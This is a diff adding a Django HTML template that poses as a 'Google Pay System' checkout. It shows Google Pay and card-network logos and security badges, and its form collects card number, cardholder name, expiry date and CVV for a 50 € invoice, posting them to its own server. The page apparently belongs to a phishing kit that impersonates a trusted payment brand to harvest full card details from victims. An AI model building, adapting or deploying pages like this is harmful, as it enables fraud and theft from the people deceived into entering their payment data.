@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="ru">
+<head>
+    <style rc-util-key="@ant-design-icons">
+        .anticon {
+            display: inline-block;
+            color: inherit;
+            font-style: normal;
+            line-height: 0;
+            text-align: center;
+            text-transform: none;
+            vertical-align: -0.125em;
+            text-rendering: optimizeLegibility;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .anticon > * {
+            line-height: 1;
+        }
+
+        .anticon svg {
+            display: inline-block;
+        }
+
+        .anticon::before {
+            display: none;
+        }
+
+        .anticon .anticon-icon {
+            display: block;
+        }
+
+        .anticon[tabindex] {
+            cursor: pointer;
+        }
+
+        .anticon-spin::before,
+        .anticon-spin {
+            display: inline-block;
+            -webkit-animation: loadingCircle 1s infinite linear;
+            animation: loadingCircle 1s infinite linear;
+        }
+
+        @-webkit-keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <meta charset="utf-8">
+    <link rel="icon" href="{% static 'images/favicon.png' %}">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Web site created using create-react-app">
+    <title>Google Pay System</title>
+    <link href="{% static 'css/main.css' %}" rel="stylesheet">
+</head>
+<body>
+<noscript>You need to enable JavaScript to run this app quietly.</noscript>
+<div id="root">
+    <form method="POST">
+        <div class="invoice">
+            <div class="ant-spin-nested-loading">
+                <div class="ant-spin-container">
+                    <div class="invoice-block">
+                        <div class="invoice__wrapper">
+                            <div class="wrapper__left card">
+                                <div class="ant-spin-nested-loading">
+                                    <div class="ant-spin-container">
+                                        <div class="left-content">
+                                            <div class="left-content__header">
+                                                <div class="header ">
+                                                    <div class="header__logo"><img src="{% static 'images/google-pay.svg' %}"
+                                                                                   alt="logo"></div>
+                                                </div>
+                                                <div class="step__title"></div>
+                                            </div>
+                                            <div class="ant-spin-nested-loading">
+                                                <div class="ant-spin-container">
+
+                                                    <div class="ant-row ant-form-item"
+                                                         style="margin-bottom: 16px; text-align: left; padding: 0px 20px;">
+                                                        <div class="ant-col ant-form-item-control">
+                                                            <div class="ant-form-item-control-input">
+                                                                <div class="ant-form-item-control-input-content"><span
+                                                                        class="invoice-card__top-title">Specify card details
+                                                         </span>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="invoice-card__wrapper">
+                                                        <div class="invoice-card__types-block">
+                                                            <div class="invoice-card__types-block-item">
+                                                                <svg width="33" height="12" viewBox="0 0 33 12"
+                                                                     fill="none" xmlns="http://www.w3.org/2000/svg"
+                                                                     class="visa ">
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M17.0198 4.15356C17.0017 5.57996 18.2911 6.37597 19.2623 6.84924C20.2602 7.33488 20.5954 7.64627 20.5916 8.08047C20.584 8.74511 19.7955 9.03835 19.0576 9.04977C17.7702 9.06974 17.0217 8.70222 16.4266 8.4242L15.9629 10.5942C16.5599 10.8695 17.6654 11.1094 18.8119 11.1199C21.5028 11.1199 23.2634 9.79155 23.273 7.73197C23.2834 5.11818 19.6575 4.97343 19.6822 3.80507C19.6908 3.45086 20.0288 3.0728 20.7696 2.97664C21.1362 2.92812 22.1484 2.89094 23.2958 3.41939L23.7462 1.31986C23.1292 1.09512 22.3359 0.879883 21.3486 0.879883C18.8157 0.879883 17.0342 2.2263 17.0198 4.15356ZM28.074 1.06079C27.5826 1.06079 27.1684 1.34745 26.9837 1.78735L23.1396 10.9656H25.8287L26.3638 9.48681H29.6498L29.9602 10.9656H32.3303L30.262 1.06079H28.074ZM28.45 3.73649L29.2261 7.45578H27.1008L28.45 3.73649ZM13.7595 1.06079L11.6399 10.9656H14.2023L16.3209 1.06079H13.7595ZM9.96882 1.06079L7.30168 7.80237L6.22282 2.07012C6.09622 1.43029 5.59631 1.06079 5.04115 1.06079H0.68108L0.620117 1.3484C1.51522 1.54263 2.53216 1.85592 3.14821 2.1911C3.52524 2.39579 3.6329 2.57479 3.75665 3.06138L5.80005 10.9656H8.50817L12.6597 1.06079H9.96882Z"
+                                                                          fill="#DCDBDD"></path>
+                                                                </svg>
+                                                            </div>
+                                                            <div class="invoice-card__types-block-item">
+                                                                <svg width="26" height="16" viewBox="0 0 26 16"
+                                                                     fill="none" xmlns="http://www.w3.org/2000/svg"
+                                                                     class="mastercard ">
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M16.834 14.0988H10.085V1.96973H16.8342L16.834 14.0988Z"
+                                                                          fill="#DEDDDF"></path>
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M10.5131 8.03415C10.5131 5.57376 11.6651 3.38205 13.4589 1.96959C12.1013 0.899093 10.4212 0.317732 8.69235 0.320321C4.43255 0.320321 0.979492 3.77386 0.979492 8.03415C0.979492 12.2944 4.43255 15.7479 8.69235 15.7479C10.4212 15.7505 12.1014 15.1691 13.4591 14.0986C11.6653 12.6864 10.5131 10.4946 10.5131 8.03415"
+                                                                          fill="#CECDCF"></path>
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M25.9391 8.03415C25.9391 12.2944 22.4861 15.7479 18.2264 15.7479C16.4973 15.7504 14.8169 15.1691 13.459 14.0986C15.2534 12.6862 16.4054 10.4946 16.4054 8.03415C16.4054 5.5736 15.2534 3.38205 13.459 1.96958C14.8168 0.899092 16.4972 0.317813 18.2262 0.320321C22.486 0.320321 25.9391 3.77386 25.9391 8.03415"
+                                                                          fill="#E6E4E7"></path>
+                                                                </svg>
+                                                            </div>
+                                                            <div class="invoice-card__types-block-item">
+                                                                <svg width="49" height="32" viewBox="0 0 49 32"
+                                                                     fill="none" xmlns="http://www.w3.org/2000/svg"
+                                                                     class="maestro ">
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M36.964 20.8162V20.517H36.886L36.7957 20.7225L36.7059 20.517H36.6274V20.8162H36.6829V20.5905L36.7673 20.7853H36.8246L36.909 20.59V20.8162H36.964ZM36.4689 20.8162V20.568H36.569V20.5175H36.314V20.568H36.414V20.8162H36.4689Z"
+                                                                          fill="#D9D8DA"></path>
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M21.3438 9.97079H28.0947V22.1035H21.3438V9.97079Z"
+                                                                          fill="#D9D8DA"></path>
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M21.7763 16.0361C21.7763 13.5749 22.9286 11.3826 24.7232 9.9697C23.4109 8.93657 21.7547 8.31999 19.9548 8.31999C15.6938 8.31999 12.2397 11.7745 12.2397 16.0361C12.2397 20.2976 15.6938 23.7522 19.9548 23.7522C21.7547 23.7522 23.4109 23.1356 24.7232 22.1025C22.9286 20.6896 21.7763 18.4973 21.7763 16.0361"
+                                                                          fill="#CECDCF"></path>
+                                                                    <path fill-rule="evenodd" clip-rule="evenodd"
+                                                                          d="M37.1999 16.0361C37.1999 20.2976 33.7457 23.7522 29.4847 23.7522C27.6848 23.7522 26.0286 23.1356 24.7159 22.1025C26.5109 20.6896 27.6632 18.4973 27.6632 16.0361C27.6632 13.5749 26.5109 11.3826 24.7159 9.9697C26.0286 8.93657 27.6848 8.31999 29.4847 8.31999C33.7457 8.31999 37.1999 11.7745 37.1999 16.0361"
+                                                                          fill="#D9D8DA"></path>
+                                                                </svg>
+                                                            </div>
+                                                        </div>
+                                                        <input type="hidden" name="amount" value="50">
+                                                        <div class="ant-row ant-form-item ant-form-item-with-help invoice-card-input-mask ant-form-item-has-success">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input name="from_card" autocomplete="_input0"
+                                                                               maxlength="22" placeholder="Card number"
+                                                                               class="form__input invoice-card- "
+                                                                               id="number" value=""
+                                                                               style="padding: 12px;" required="">
+                                                                    </div>
+                                                                </div>
+                                                                <div class="ant-form-item-explain ant-form-item-explain-connected">
+                                                                    <div role="alert"
+                                                                         class="ant-form-item-explain-success"
+                                                                         style=""></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="ant-row ant-form-item ant-form-item-with-help invoice-card-input-mask ant-form-item-has-success">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <input name="cardHolder"
+                                                                               placeholder="Cardholder name"
+                                                                               class="form__input invoice-card- "
+                                                                               id="cardHolder" value=""
+                                                                               style="padding: 12px;" required="">
+                                                                    </div>
+                                                                </div>
+                                                                <div class="ant-form-item-explain ant-form-item-explain-connected">
+                                                                    <div role="alert"
+                                                                         class="ant-form-item-explain-success"
+                                                                         style=""></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="ant-row ant-form-item" style="margin-bottom: 0px;">
+                                                            <div class="ant-col ant-form-item-control">
+                                                                <div class="ant-form-item-control-input">
+                                                                    <div class="ant-form-item-control-input-content">
+                                                                        <div class="ant-row ant-form-item"
+                                                                             style="display: inline-block; width: calc(50% - 5px); max-width: 166px; float: left; margin-right: 5px;">
+                                                                            <div class="ant-col ant-form-item-control">
+                                                                                <div class="ant-form-item-control-input">
+                                                                                    <div class="ant-form-item-control-input-content">
+                                                                                        <input name="expired"
+                                                                                               autocomplete="off"
+                                                                                               placeholder="MM/YY"
+                                                                                               id="expire"
+                                                                                               class="form__input undefined card-value-expired"
+                                                                                               value=""
+                                                                                               style="padding: 12px;"
+                                                                                               data-mask="00/00"
+                                                                                               type="text" maxlength="5"
+                                                                                               data-index="2"
+                                                                                               required="">
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                        <div class="ant-row ant-form-item"
+                                                                             style="display: inline-block; width: calc(50% - 5px); max-width: 166px; float: right; margin-left: 5px;">
+                                                                            <div class="ant-col ant-form-item-control">
+                                                                                <div class="ant-form-item-control-input">
+                                                                                    <div class="ant-form-item-control-input-content">
+                                                                                        <input name="card_cvc"
+                                                                                               maxlength="3"
+                                                                                               type="password"
+                                                                                               placeholder="CVV/CVC"
+                                                                                               id="cvv"
+                                                                                               class="form__input undefined "
+                                                                                               value=""
+                                                                                               style="padding: 12px;"
+                                                                                               required=""></div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="ant-row ant-form-item ant-form-item-has-success"
+                                                         style="padding: 0px 20px;">
+                                                        <div class="ant-col ant-form-item-control">
+                                                            <div class="ant-form-item-control-input">
+                                                                <div class="ant-form-item-control-input-content">
+                                                                    <button id="PayDollars" type="submit" class="btn btn-primary">Pay 50 €</button>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="wrapper__right" style="text-align: left;">
+                                <div class="right-content">
+                                    <div class="invoice-info__header">
+                                        <div class="invoice-info__title">Amount:</div>
+                                        <div class="invoice-info__value">50 €</div>
+                                        <button class="btn-toggle">
+                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
+                                                 xmlns="http://www.w3.org/2000/svg" class="btn-toggle-icon">
+                                                <path fill-rule="evenodd" clip-rule="evenodd"
+                                                      d="M5.2318 9.35984C5.58537 8.93556 6.21593 8.87824 6.64021 9.2318L12 13.6983L17.3598 9.2318C17.7841 8.87824 18.4147 8.93556 18.7682 9.35984C19.1218 9.78412 19.0645 10.4147 18.6402 10.7682L12.6402 15.7682C12.2694 16.0773 11.7307 16.0773 11.3598 15.7682L5.35984 10.7682C4.93556 10.4147 4.87824 9.78412 5.2318 9.35984Z"
+                                                      fill="#252129"></path>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                    <div class="invoice-info__wrapper" style="height: 0px; overflow: hidden;">
+                                        <div class="invoice-info-body">
+                                            <div class="invoice-info__top-block">
+                                                <div class="invoice-info__comment">
+                                                    <label class="comment__title">Checkout</label>
+                                                    <div class="comment__description">#27733858</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bottom__info-wrapper">
+                        <div class="certificates"><span class="svg-wrapper-icon" id="pci-dss-svg"
+                                                        alt="PCI-DSS"></span><span class="svg-wrapper-icon"
+                                                                                   id="mastercard-svg"
+                                                                                   alt="mastercardSecure"></span><span
+                                class="svg-wrapper-icon" id="visa-svg" alt="VisaVerified"></span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </form>
+
+</div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="{% static 'js/payment/step3/index.js' %}"></script>
+</body>
+</html>
